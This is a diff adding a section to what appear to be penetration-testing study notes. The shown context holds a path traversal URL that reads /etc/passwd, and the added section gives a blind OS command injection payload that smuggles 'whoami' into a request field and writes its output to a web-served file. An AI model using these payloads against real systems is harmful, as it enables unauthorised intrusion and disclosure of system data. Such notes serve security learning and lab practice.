@@ -174,3 +174,17 @@ https://invented-domain.com/image?filename=....//....//....//etc/passwd
 ```
 
 Otherwise, if you want to do it manual you can use BurpSuite and try some combinations.
+
+## Blind OS command injection
+
+If you've got this kind of request:
+
+![](Pasted%20image%2020240513160938.png)
+
+Use the following payload:
+
+```shell
+||whoami>>/var/www/images/results.txt||
+```
+
+![](Pasted%20image%2020240513161049.png)
